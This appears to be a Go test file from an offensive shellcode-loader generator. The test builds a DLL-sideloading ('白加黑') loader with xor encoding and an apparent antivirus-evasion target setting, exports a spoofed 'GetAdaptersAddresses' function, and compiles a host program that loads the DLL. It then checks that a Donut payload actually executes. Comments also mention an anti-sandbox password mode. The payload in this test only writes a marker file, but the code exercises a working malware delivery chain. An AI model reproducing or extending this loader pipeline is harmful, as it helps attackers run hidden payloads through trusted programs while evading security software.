package util

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

// TestBaiJiaHeiDllExecutesPayload 白加黑（loader10）链路执行验证。
//
// 白加黑专用模板带 `import "C"`，只能以 -buildmode=c-shared 走 cgo 链路编译成 DLL，
// 由白程序加载后调用导出函数触发载荷（一体模式编译必然失败，属预期）。
// 这里完整走一遍：生成白加黑源码 → cgo 编译 DLL → 用 rundll32 调用导出函数 →
// 断言 Donut 载荷真的执行（标记文件出现）。
func TestBaiJiaHeiDllExecutesPayload(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	if FindMinGW("mingw64") == nil {
		t.Skip("未找到 MinGW-w64，无法验证白加黑 DLL 链路")
	}
	ensureGoModule(t)

	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	markerPath := filepath.Join(os.TempDir(), execMarkerName)

	pic := buildMarkerPayload(t, dir)
	writeOneShotDataFiles(t, dir, pic)

	const (
		exportName = "GetAdaptersAddresses"
		dllName    = "e2ehost.dll"
	)

	out, gerr := GenGoFile(LoaderBaiJiaHei, "白加黑", "xor", "否", "false", "false", "", "false", "",
		exportName, []string{exportName}, []string{exportName})
	if gerr != nil || out == "" {
		t.Fatalf("白加黑源码生成失败: %v", gerr)
	}

	// 让 CheckGoBuild 把 DLL 输出到临时目录，避免污染仓库
	origCwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	outBase := t.TempDir()
	if err := os.Chdir(outBase); err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Chdir(origCwd) }()

	if berr := CheckGoBuild(out, dllName, "360", "go", "白加黑", dllName, "", "x64", "windows", false); berr != nil {
		t.Fatalf("白加黑 DLL 编译失败: %v", berr)
	}
	dllPath := filepath.Join(outBase, "EasyToolsFiles", "file", dllName)
	st, serr := os.Stat(dllPath)
	if serr != nil {
		t.Fatalf("未生成 DLL: %v", serr)
	}
	t.Logf("白加黑 DLL: %s (%d 字节)", dllPath, st.Size())

	// 导出表应包含目标函数名
	raw, rerr := os.ReadFile(dllPath)
	if rerr != nil {
		t.Fatal(rerr)
	}
	if !bytes.Contains(raw, []byte(exportName)) {
		t.Fatalf("DLL 中未找到导出名 %s", exportName)
	}

	// 由宿主程序 LoadLibrary + GetProcAddress 调用导出函数（等价白程序加载 DLL 的行为）
	// 说明：不用 rundll32——它要求导出函数是标准 CALLBACK 四参数签名，
	// 且 Go c-shared 导出的调用约定/初始化路径与真实白程序加载不同，会得到假阴性。
	hostPath := buildDllHost(t, outBase, dllPath, exportName)

	_ = os.Remove(markerPath)
	host := exec.Command(hostPath, dllPath, exportName)
	hostOut, _ := host.CombinedOutput()
	t.Logf("宿主输出: %s", string(bytes.TrimSpace(hostOut)))
	seen := false
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		if _, statErr := os.Stat(markerPath); statErr == nil {
			seen = true
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	_ = os.Remove(markerPath)

	if !seen {
		t.Fatal("白加黑 DLL 导出函数被调用后，载荷未执行（标记文件未出现）")
	}
	t.Logf("白加黑 %s!%s 调用成功，payload 已执行 ✓", dllName, exportName)
}

// buildDllHost 生成一个最小宿主 EXE：LoadLibrary(目标 DLL) → GetProcAddress(导出) → 调用。
// 这正是白程序加载白加黑 DLL 的核心动作，用于验证 DLL 侧载荷能否真正跑起来。
func buildDllHost(t *testing.T, dir, dllPath, exportName string) string {
	t.Helper()
	srcDir := filepath.Join(dir, "host")
	if err := os.MkdirAll(srcDir, 0o755); err != nil {
		t.Fatal(err)
	}
	src := `package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
)

func main() {
	// 优先用环境变量（反沙箱口令模式下宿主 argv 被 loader 的 flag.Parse 占用）
	dllPath, exportName := os.Getenv("MATRIX_DLL"), os.Getenv("MATRIX_EXPORT")
	if dllPath == "" || exportName == "" {
		if len(os.Args) < 3 {
			fmt.Println("usage: host <dll> <export>  (or MATRIX_DLL/MATRIX_EXPORT)")
			os.Exit(2)
		}
		dllPath, exportName = os.Args[1], os.Args[2]
	}
	dll, err := syscall.LoadDLL(dllPath)
	if err != nil {
		fmt.Println("LoadDLL failed:", err)
		os.Exit(3)
	}
	proc, err := dll.FindProc(exportName)
	if err != nil {
		fmt.Println("FindProc failed:", err)
		os.Exit(4)
	}
	r, _, lastErr := proc.Call()
	fmt.Println("export called, ret=", r, "err=", lastErr)
	time.Sleep(500 * time.Millisecond)
}
`
	srcPath := filepath.Join(srcDir, "main.go")
	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
		t.Fatal(err)
	}
	hostPath := filepath.Join(srcDir, "host.exe")
	cmd := exec.Command("go", "build", "-o", hostPath, srcPath)
	cmd.Dir = srcDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("构建 DLL 宿主失败: %v\n%s", err, string(out))
	}
	return hostPath
}
